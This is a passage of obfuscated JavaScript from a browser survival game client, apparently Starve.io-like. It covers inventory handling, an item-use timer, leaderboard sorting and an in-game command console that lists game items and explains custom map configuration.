								Ⲇⵠⵠ[ΔΔΔⵠⵠ] = Ⲇⵠⵠ[this.item];
								Ⲇⵠⵠ[this.item] = ⲆᐃᐃᐃⵠΔᐃᐃΔ;
								ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
							}
						}
						this.stop();
						return ΔΔᐃΔⵠ
					},
					"ΔᐃΔⵠ": function(Δⵠ, ⲆⵠⲆ) {
						if (!this.ΔⵠΔΔΔⲆᐃ || !this.ΔⲆⲆᐃΔⵠΔ) return;
						ΔⲆΔⵠ(Δ, this.ᐃⵠ, Math.floor(Δⵠ - this.ᐃⵠ.width / 2), Math.floor(ⲆⵠⲆ - this.ᐃⵠ.height / 2))
					}
				},
				"ᐃᐃᐃⵠᐃᐃⵠᐃᐃ": function(ⲆⲆⵠ) {
					for (ⵠᐃ = 0; ⵠᐃ < ⲆⲆⵠ.length; ⵠᐃ++) {
						if (this.ᐃⵠⵠⵠ[ⲆⲆⵠ[ⵠᐃ][ΔⲆⵠⲆ]] == ⲆⲆⵠ[ⵠᐃ][ΔⵠⲆΔ]) return true
					}
					return false
				},
				"ⲆΔⲆⵠⲆ": function(ᐃΔ) {
					for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < this.ⵠΔᐃⲆⵠ.length; ⵠᐃ++) {
						if (this.ⵠΔᐃⲆⵠ[ⵠᐃ].id == ᐃΔ) return ⵠᐃ
					}
					return -1
				},
				"ᐃⲆΔⲆΔⲆΔ": function(ᐃΔ, ⵠᐃ) {
					this.ᐃⵠⵠⵠ[ᐃΔ] = 0;
					this.ⵠΔᐃⲆⵠ.splice(ⵠᐃ, 1);
					ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
				},
				"ΔⵠⲆΔᐃⵠΔ": function(ᐃΔ, ᐃⵠⵠⵠ, ⵠᐃ) {
					ⵠⲆᐃ = ΔᐃⲆⵠⵠ;
					this.ᐃⵠⵠⵠ[ᐃΔ] = Math.max(ⲆΔⵠ, this.ᐃⵠⵠⵠ[ᐃΔ] - ᐃⵠⵠⵠ);
					if (!this.ᐃⵠⵠⵠ[ᐃΔ] && ⵠᐃ >= ⵠⲆⲆ) this.ᐃⲆΔⲆΔⲆΔ(ᐃΔ, ⵠᐃ)
				}
			};
			this.ᐃⵠⲆᐃⵠ = {
				enabled: ⲆⵠΔⵠΔ,
				translate: {
					y: 0,
					x: 0
				},
				"ⵠⲆᐃⲆⲆⵠᐃ": function() {
					if (ⲆⲆⲆ.mode != ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ || ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ) return;
					ᐃᐃΔ.ᐃⵠⲆᐃⵠ.enabled = !ᐃᐃΔ.ᐃⵠⲆᐃⵠ.enabled;
					if (ᐃᐃΔ.ᐃⵠⲆᐃⵠ.enabled) ΔⵠⵠⲆ.options.ⵠⲆΔΔⲆⵠⲆ.display = ⵠ[35];
					else ΔⵠⵠⲆ.options.ⵠⲆΔΔⲆⵠⲆ.display = ⵠ[465]
				}
			};
			ΔⵠⵠⲆ.options.ⵠⲆΔΔⲆⵠⲆ.display = ⵠ[465];
			this.ⵠⲆⵠᐃᐃ = {
				enabled: ᐃᐃⵠΔⵠ,
				translate: {
					y: Δⵠᐃ,
					x: 0
				},
				"ΔⲆΔⲆΔ": ΔⲆⲆ,
				"ⵠⲆᐃⲆⲆⵠᐃ": function() {
					ᐃᐃΔ.ⵠⲆⵠᐃᐃ.enabled = !ᐃᐃΔ.ⵠⲆⵠᐃᐃ.enabled;
					if (ᐃᐃΔ.ⵠⲆⵠᐃᐃ.enabled) ΔⵠⵠⲆ.options.ⲆⲆⲆΔΔΔⵠ.display = ⵠ[35];
					else ΔⵠⵠⲆ.options.ⲆⲆⲆΔΔΔⵠ.display = ⵠ[465]
				},
				"ⵠⲆᐃ": function() {
					if (!this.enabled || ᐃᐃΔ.ⵠΔΔⲆ.id >= ΔΔⵠⵠ || ΔⵠⵠⲆ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
					this.ΔⲆΔⲆΔ += ᐃⵠᐃᐃ;
					if (this.ΔⲆΔⲆΔ > ⵠΔᐃᐃⵠ) {
						this.ΔⲆΔⲆΔ = 0;
						if (ᐃᐃΔ.ⲆΔⲆⵠ.ⵠⵠᐃ < .35) {
							if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⵠⲆΔⲆⲆ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⵠⲆΔⲆⲆ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆΔⲆⲆ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⲆΔⵠΔⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⲆΔⵠΔⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⲆΔⵠΔⵠ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ΔⵠⲆΔⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ΔⵠⲆΔⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔⵠⲆΔⵠ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⲆⲆⵠΔΔ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⲆⲆⵠΔΔ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⲆⲆⵠΔΔ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ᐃⲆⲆᐃⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ᐃⲆⲆᐃⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ᐃⲆⲆᐃⵠ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⵠⲆΔⲆΔ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⵠⲆΔⲆΔ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆΔⲆΔ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ΔΔΔᐃⲆ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ΔΔΔᐃⲆ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔΔΔᐃⲆ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⲆΔⵠΔⲆ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⲆΔⵠΔⲆ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⲆΔⵠΔⲆ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⲆᐃⲆⲆⲆ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⲆᐃⲆⲆⲆ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⲆᐃⲆⲆⲆ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.Ⲇⵠᐃᐃⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.Ⲇⵠᐃᐃⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.Ⲇⵠᐃᐃⵠ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ΔⵠⲆᐃᐃ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ΔⵠⲆᐃᐃ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔⵠⲆᐃᐃ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ΔⵠⲆⵠⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ΔⵠⲆⵠⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔⵠⲆⵠⵠ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⲆΔΔⲆᐃ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⲆΔΔⲆᐃ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⲆΔΔⲆᐃ));
							else if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ᐃΔΔΔⵠ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ᐃΔΔΔⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ᐃΔΔΔⵠ))
						} else if (ᐃᐃΔ.ⲆΔⲆⵠ.ΔᐃⲆ < .35) {
							if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃ.ⵠⲆᐃᐃᐃ]) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ᐃᐃ.ⵠⲆᐃᐃᐃ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆᐃᐃᐃ))
						}
					}
				}
			};
			ΔⵠⵠⲆ.options.ⲆⲆⲆΔΔΔⵠ.display = ⵠ[465];
			this.ⵠΔΔⲆ = {
				id: -ᐃᐃⵠ,
				"ⵠΔᐃⲆ": -ᐃΔᐃⲆ,
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔᐃⲆΔ, 0, ΔⵠⲆΔ, 0, ⵠΔᐃ, ΔⵠⲆΔ),
				"ⲆΔΔⲆⲆ": false,
				"ᐃΔᐃᐃ": -1,
				mode: Ⲇᐃᐃᐃ,
				label: [],
				"ⵠⵠᐃΔᐃ": [],
				"ⵠⵠⵠᐃΔ": ᐃⵠⵠⲆᐃ,
				"ⵠᐃⲆΔⲆ": ᐃⵠⵠⲆᐃ,
				"ᐃⵠΔᐃᐃΔⵠ": ⲆΔⲆᐃΔ,
				"Ⲇⵠⵠⵠⵠ": false,
				"ᐃΔⲆⵠⲆⵠᐃᐃΔ": function() {
					this.mode = this.mode === 0 ? 1 : 0
				},
				"ⵠⵠⵠΔⲆⲆⵠᐃⲆ": function(ⵠΔⵠⵠΔ) {
					this.ⵠⵠⵠᐃΔ = ⵠΔⵠⵠΔ;
					var ⵠΔΔΔⵠᐃⵠ = ΔⵠⵠⲆ.ⵠⵠᐃᐃ;
					if (ⵠΔΔΔⵠᐃⵠ[ΔᐃⲆⵠⲆⵠΔ[72]]) ⵠΔΔΔⵠᐃⵠ.ΔⵠⲆⲆⲆⲆᐃ(ⵠΔΔΔⵠᐃⵠ.button);
					this.ⵠⲆᐃ()
				},
				"ⵠᐃⵠⲆⵠᐃΔᐃⵠ": function(ᐃΔ) {
					var ⲆⲆⵠ = ⵠⲆⵠᐃΔ[ᐃΔ];
					this.id = ᐃΔ;
					this.ⲆΔΔⲆⲆ = ⲆⵠⲆᐃⲆΔΔ;
					var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
					this.timeout.ΔⵠᐃΔⲆΔᐃ = ⲆⲆⵠ.time * ⵠⲆⲆΔΔ;
					this.ⵠΔᐃⲆ = ⲆⲆⵠ.ⵠΔᐃⲆ
				},
				"ⲆⲆⲆΔⲆⵠⵠⵠΔ": function(ᐃΔ) {
					var ⲆⲆⵠ = ⵠⲆⵠᐃΔ[ᐃΔ];
					this.id = ᐃΔ;
					this.ⲆΔΔⲆⲆ = ΔᐃΔΔⵠ;
					var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
					if (ᐃⲆⲆ && ᐃⲆⲆ.right == ᐃᐃ.ⵠⵠⲆⵠⲆ) this.timeout.ΔⵠᐃΔⲆΔᐃ = ⲆⲆⵠ.time * 3;
					else this.timeout.ΔⵠᐃΔⲆΔᐃ = ⲆⲆⵠ.time;
					this.ⵠΔᐃⲆ = ⲆⲆⵠ.ⵠΔᐃⲆ;
					for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⵠ.r.length; ⵠᐃ++) {
						var ᐃⲆΔ = ⲆⲆⵠ.r[ⵠᐃ];
						ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠⲆΔᐃⵠΔ(ᐃⲆΔ[ⵠⲆⲆ], ᐃⲆΔ[1], ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃⲆΔ[ᐃⵠⲆⵠ]))
					}
					ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
				},
				"ⵠⲆᐃ": function() {
					this.ⵠⵠᐃΔᐃ = [];
					if (ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠΔΔⲆ === 1) ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.display = 0;
					for (var ⵠᐃⲆⲆ in ⵠⲆⵠᐃΔ) {
						var ⲆⲆⵠ = ⵠⲆⵠᐃΔ[ⵠᐃⲆⲆ];
						var ⵠⵠᐃΔᐃ = ᐃⲆᐃᐃⲆ;
						if (!ⲆⲆⵠ.r) continue;
						for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⵠ.r.length; ⵠᐃ++) {
							if (ᐃᐃΔ.ⲆⵠⲆⵠ.max >= ΔᐃᐃΔ.ⲆΔⲆΔᐃⵠⲆ && ⲆⲆⵠ.id === ᐃᐃⲆ.ⵠᐃᐃⵠ) {
								ⵠⵠᐃΔᐃ = ⲆⲆⲆᐃⵠ;
								break
							}
							if (ⲆⲆⵠ.w > this.ⵠⵠⵠᐃΔ || ⲆⲆⵠ.f > this.ⵠᐃⲆΔⲆ || ⲆⲆⵠ.ᐃⲆΔ > this.ᐃⵠΔᐃᐃΔⵠ || ⲆⲆⵠ.e > this.Ⲇⵠⵠⵠⵠ) {
								ⵠⵠᐃΔᐃ = ᐃⲆᐃⵠΔ;
								break
							}
							var ᐃⲆΔ = ⲆⲆⵠ.r[ⵠᐃ];
							if (!ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃⲆΔ[0]] || ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃⲆΔ[ᐃΔΔ]] < ᐃⲆΔ[1]) {
								ⵠⵠᐃΔᐃ = ⵠᐃⵠᐃᐃ;
								break
							}
						}
						if (ⵠⵠᐃΔᐃ) this.ⵠⵠᐃΔᐃ.push(ΔⵠⵠⲆ.ⵠⵠⲆ[ⲆⲆⵠ.id])
					}
					ΔⵠⵠⲆ.ⵠᐃΔΔⵠᐃΔ();
					ΔⵠⵠⲆ.ᐃᐃⲆΔⲆⲆΔ();
					ΔⵠⵠⲆ.ᐃΔⵠⲆⲆⵠΔ();
					ΔⵠⵠⲆ.ΔΔᐃⲆΔⵠⵠ();
					ΔⵠⵠⲆ.ⲆΔΔⵠⲆᐃΔ();
					ΔⵠⵠⲆ.ᐃⵠⵠᐃΔᐃⵠ();
					ΔⵠⵠⲆ.sign.ΔΔᐃΔⵠΔⲆ()
				},
				"ᐃᐃᐃΔΔⲆᐃ": function() {
					this.id = -ΔᐃⲆⵠ;
					this.ⲆΔΔⲆⲆ = ΔᐃⵠᐃⲆ;
					this.timeout.ΔᐃΔ = 0;
					this.timeout.ᐃⲆΔ = ᐃᐃⵠΔⵠ;
					this.ⵠⲆᐃ()
				}
			};
			this.ⵠΔᐃⲆᐃⲆᐃ = {
				message: ⲆⲆⲆⵠⵠ,
				"ΔᐃΔⵠ": ᐃⲆⵠΔⲆⵠΔᐃᐃ
			};
			this.alert = {
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃⵠᐃᐃ, 1, ΔⵠΔⵠ, 0, 4, .3),
				text: "",
				label: null,
				"ΔᐃΔⵠ": ΔᐃⲆⲆⵠⵠⲆⵠΔ,
				list: []
			};
			this.ᐃΔΔⲆⵠ = {
				"Ⲇⵠ": document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]),
				"ⲆⵠⲆΔⵠ": [],
				"ⵠⲆᐃ": ⵠΔΔⵠΔⵠᐃ,
				translate: {
					y: 0,
					x: 0
				},
				sort: function() {
					var ᐃΔΔⲆΔΔᐃ = [];
					var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
					for (var ⵠᐃ = ΔΔⵠⵠ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
						if (ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔΔ) ᐃΔΔⲆΔΔᐃ.push({
							id: ⵠᐃ,
							"ᐃⵠⲆΔ": ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠᐃⵠⵠ
						})
					}
					ᐃΔΔⲆΔΔᐃ.sort((function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
						return ⲆᐃΔⲆ.ᐃⵠⲆΔ - ⲆⲆᐃⲆ.ᐃⵠⲆΔ
					}));
					this.ⲆⵠⲆΔⵠ = [];
					for (var ⵠᐃ = 0; ⵠᐃ < ᐃΔΔⲆΔΔᐃ.length && ⵠᐃ < ⲆⵠⲆⵠⲆ; ⵠᐃ++) this.ⲆⵠⲆΔⵠ.push(ᐃΔΔⲆΔΔᐃ[ⵠᐃ].id);
					this.ⵠⲆᐃ = true
				},
				"ⲆⲆⲆΔⵠ": function(ᐃᐃᐃΔ) {
					var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
					for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠᐃⵠⵠ = 0;
					ᐃᐃᐃⵠ[ᐃᐃΔ.id].ᐃⵠᐃⵠⵠ = ΔΔⲆᐃ.ᐃⵠΔⲆⵠᐃⵠ(ᐃᐃᐃΔ[ΔᐃⲆⵠ]);
					this.ⲆⵠⲆΔⵠ = [];
					for (var ⵠᐃ = 2; ⵠᐃ < ᐃᐃᐃΔ.length; ⵠᐃ += 2) {
						this.ⲆⵠⲆΔⵠ.push(ᐃᐃᐃΔ[ⵠᐃ]);
						ᐃᐃᐃⵠ[ᐃᐃᐃΔ[ⵠᐃ]].ᐃⵠᐃⵠⵠ = ΔΔⲆᐃ.ᐃⵠΔⲆⵠᐃⵠ(ᐃᐃᐃΔ[ⵠᐃ + ΔΔᐃⵠ])
					}
					this.ⵠⲆᐃ = ᐃⵠΔᐃΔ
				}
			};
			this.ᐃΔΔⲆⵠ.Ⲇⵠ.width = ᐃ * 180;
			this.ᐃΔΔⲆⵠ.Ⲇⵠ.height = 300 * ᐃ;
			this.ᐃΔΔⲆⵠ.Δ = this.ᐃΔΔⲆⵠ.Ⲇⵠ.getContext(ⵠ[289]);
			this.ᐃᐃᐃⲆΔ = {
				open: ᐃᐃⵠΔⵠ,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]]("commandInput"),
				"ⲆΔᐃⵠΔⵠⵠ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("commandsBox"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("commandMainBox").style,
				"ᐃᐃⲆΔᐃⲆΔΔⲆ": function(Δⵠⵠᐃ) {
					this.ⲆΔᐃⵠΔⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[290]] += Δⵠⵠᐃ
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(ΔΔΔᐃ / ᐃⲆΔⲆ - 300) + ⵠ[39];
					this.style.top = Math.floor(ⵠⲆᐃⲆ / 2 - 250) + ⵠ[39]
				},
				"ⵠΔⲆⲆΔΔⲆΔⲆ": function() {
					this.ⲆΔᐃⵠΔⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[290]] = ""
				},
				"ⵠΔΔΔᐃ": function() {
					this[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔⲆᐃΔ;
					this.style.display = ⵠ[465]
				},
				"ⵠⵠⵠⵠⵠ": function(ΔΔⲆᐃΔ) {
					var ⵠᐃᐃⲆⲆ = '<table class="tableList">';
					for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < ΔΔⲆᐃΔ.length; ⵠᐃ++) {
						if (ⵠᐃ % 3 === ⵠΔⲆⵠ) ⵠᐃᐃⲆⲆ += "<tr>";
						ⵠᐃᐃⲆⲆ += '<td class="tableList">' + ΔΔⲆᐃΔ[ⵠᐃ] + "</td>";
						if ((ⵠᐃ + ⵠΔᐃ) % 3 === 0 || ⵠᐃ + ᐃΔᐃⲆ === ΔΔⲆᐃΔ.length) ⵠᐃᐃⲆⲆ += "</tr>"
					}
					ⵠᐃᐃⲆⲆ += "</table>";
					return ⵠᐃᐃⲆⲆ
				},
				"ΔⲆⵠⵠⵠ": function(cmd, ᐃⵠⵠⲆΔⵠᐃ, ⵠⲆΔⲆⲆⵠᐃ, ⵠᐃᐃⲆⲆ) {
					cmd = !cmd ? "" : cmd;
					ᐃⵠⵠⲆΔⵠᐃ = !ᐃⵠⵠⲆΔⵠᐃ ? "" : ᐃⵠⵠⲆΔⵠᐃ;
					ⵠⲆΔⲆⲆⵠᐃ = !ⵠⲆΔⲆⲆⵠᐃ ? "" : ⵠⲆΔⲆⲆⵠᐃ;
					ⵠᐃᐃⲆⲆ = !ⵠᐃᐃⲆⲆ ? "" : ⵠᐃᐃⲆⲆ;
					var ΔⲆⵠΔ = "<div class=commandWritten>" + cmd;
					if (ᐃⵠⵠⲆΔⵠᐃ) ΔⲆⵠΔ += "<div class=commandValidated>";
					else ΔⲆⵠΔ += "<div class=commandUnknown>";
					ΔⲆⵠΔ += ⵠⲆΔⲆⲆⵠᐃ + ⵠ[123] + ⵠᐃᐃⲆⲆ + ⵠ[123];
					this.ᐃᐃⲆΔᐃⲆΔΔⲆ(ΔⲆⵠΔ);
					this.ⵠᐃⵠⲆΔⵠⲆⵠᐃ()
				},
				"ⵠᐃⵠⲆΔⵠⲆⵠᐃ": function() {
					this.ⲆΔᐃⵠΔⵠⵠ["scrollTop"] = this.ⲆΔᐃⵠΔⵠⵠ["scrollHeight"];
					return
				},
				"ⵠⵠⵠᐃⵠⵠⵠ": function(ᐃⲆᐃⵠ) {
					switch (ᐃⲆᐃⵠ) {
						case "clean":
							this.ⵠΔⲆⲆΔΔⲆΔⲆ();
							return ⲆⵠⵠᐃⲆ;
							break;
						case "list":
							var ᐃᐃᐃⲆ = "";
							const ⵠΔⲆⵠᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[224]]("div");
							var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
							for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
								var ⵠΔⲆΔ = ᐃᐃᐃⵠ[ⵠᐃ];
								if (ⵠΔⲆΔ.ᐃⵠⵠΔΔ) {
									ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⵠΔⲆΔ.ⵠΔⵠⲆᐃ;
									ᐃᐃᐃⲆ += ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]] + ' <span style="color:green">#' + ⵠᐃ + "</span><br />"
								}
							}
							this.ΔⲆⵠⵠⵠ("list", ΔⲆⵠ, "List all connected players", ᐃᐃᐃⲆ);
							return true;
							break;
						case "weapon-list":
							this.ΔⲆⵠⵠⵠ("Weapons", ΔᐃᐃⲆ, "List all weapons in the game", this.ⵠⵠⵠⵠⵠ(["sword_wood", "sword", "sword_gold", "sword_diamond", "sword_amethyst", "sword_reidite", "dragon_sword", "lava_sword", "sword_pirate", "wood_spear", "spear", "gold_spear", "diamond_spear", "amethyst_spear", "reidite_spear", "dragon_spear", "lava_spear", "crab_spear", "wood_bow", "wood_arrow", "wood_axe", "stone_axe", "gold_axe", "diamond_axe", "amethyst_axe", "reidite_axe"]));
							return true;
							break;
						case "tool-list":
							this.ΔⲆⵠⵠⵠ("Tools", ΔΔΔ, "List all tools in the game", this.ⵠⵠⵠⵠⵠ(["pick_wood", "pick", "pick_gold", "pick_diamond", "pick_amethyst", "pick_reidite", "hammer", "hammer_gold", "hammer_diamond", "hammer_amethyst", "hammer_reidite", "super_hammer", "shovel", "shovel_gold", "shovel_diamond", "shovel_amethyst", "pitchfork", "pitchfork2", "spanner", "book"]));
							return ⲆᐃΔⲆⲆ;
							break;
						case "survival-list":
							this.ΔⲆⵠⵠⵠ("Survival Items", Ⲇᐃⵠ, "List all survival items in the game", this.ⵠⵠⵠⵠⵠ(["fire", "workbench", "bandage", "big_fire", "furnace", "paper", "blue_cord", "lock", "lockpick", "totem", "resurrection", "bridge", "bottle_full", "bottle_empty", "watering_can", "watering_can_full", "windmill", "plot", "bread_oven", "chest", "bucket_empty", "bucket_full", "well", "sign", "roof", "bed", "boat", "sled", "boar", "saddle", "emerald_machine", "extractor_stone", "extractor_gold", "extractor_diamond", "extractor_amethyst", "extractor_reidite_button"]));
							return ⲆⲆΔⲆⲆ;
							break;
						case "resource-list":
							this.ΔⲆⵠⵠⵠ("Resources", 1, "List all resources in the game", this.ⵠⵠⵠⵠⵠ(["wood", "stone", "gold", "diamond", "amethyst", "reidite", "fur", "fur_wolf", "fur_winter", "cord", "scales", "penguin_feather", "flame", "sand", "ground", "ice", "dragon_heart", "lava_heart", "kraken_skin", "special_fur", "special_fur_2", "gemme_green", "gemme_orange", "gemme_blue", "dragon_cube", "dragon_orb", "lava_cube", "lava_orb", "fur_boar", "pitchfork_part", "pilot_glasses", "fur_mammoth"]));
							return true;
							break;
						case "food-list":
							this.ΔⲆⵠⵠⵠ("Food", ᐃᐃⵠ, "List all food in the game", this.ⵠⵠⵠⵠⵠ(["plant", "seed", "meat", "cooked_meat", "flour", "wheat_seed", "cookies", "wild_wheat", "cake", "fish", "cooked_fish", "bread", "sandwich", "pumpkin_seed", "pumpkin", "garlic_seed", "garlic", "thornbush_seed", "thornbush", "crab_stick", "claw", "carrot_seed", "carrot", "tomato_seed", "tomato", "watermelon_seed", "watermelon", "aloe_vera_seed", "aloe_vera", "cactus"]));
							return true;
							break;
						case "hat-list":
							this.ΔⲆⵠⵠⵠ("Hats", ⵠΔΔ, "List all hats in the game", this.ⵠⵠⵠⵠⵠ(["earmuffs", "coat", "scarf", "fur_hat", "warm_protection", "warm_protection2", "warm_protection3", "explorer_hat", "pirate_hat", "wood_helmet", "stone_helmet", "gold_helmet", "diamond_helmet", "amethyst_helmet", "reidite_helmet", "dragon_helmet", "lava_helmet", "crab_helmet", "diving_mask", "super_diving_suit", "crown_green", "crown_orange", "crown_blue", "hood", "peasant", "winter_hood", "winter_peasant", "bag", "turban1", "turban2", "pilot_hat"]));
							return true;
							break;
						case "building-list":
							this.ΔⲆⵠⵠⵠ("Buildings", ⵠᐃⵠΔ, "List all buildings in the game", this.ⵠⵠⵠⵠⵠ(["wall", "stone_wall", "gold_wall", "diamond_wall", "amethyst_wall", "reidite_wall", "spike", "stone_spike", "gold_spike", "diamond_spike", "amethyst_spike", "reidite_spike", "wood_door", "stone_door", "gold_door", "diamond_door", "amethyst_door", "reidite_door", "wood_spike_door", "stone_spike_door", "gold_spike_door", "diamond_spike_door", "amethyst_spike_door", "reidite_spike_door"]));
							return true;
							break;
						case "biome-list":
							this.ΔⲆⵠⵠⵠ("Biomes list", 1, "List all available biomes in the game", this.ⵠⵠⵠⵠⵠ([ⵠ[423], "winter", "lava", "sea", "beach", "island", "dragon"]));
							return true;
							break;
						case "help-config":
							this.ΔⲆⵠⵠⵠ("Help Configuration", 1, "Learn how to build your customized map", '<div class="specialCommandBox">To get the current map configuration, and modify it, copy the result of <span class="commandSynthax">get-config</span> in a text file and change every parameter you want.</div>To modify the settings, change a number to another with <span class="commandSynthax">set-config</span></br>To modify the map, modify "important" section (at the end)<div class="infoCommand">The minimum size of the map is 50x50.</div>"custom_map" is used to change the biomes and is written like this :<div class="commandSynthax" style="font-size:17px;">"custom_map":[["biome",width,height],...,["biome",width,height]]</div>Biomes are <span class="commandSynthax">"forest"</span>, <span class="commandSynthax">"lava"</span>, <span class="commandSynthax">"winter"</span>, and <span class="commandSynthax">"dragon"</span>.');
							return true;
							break;
						case "pos":
							var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
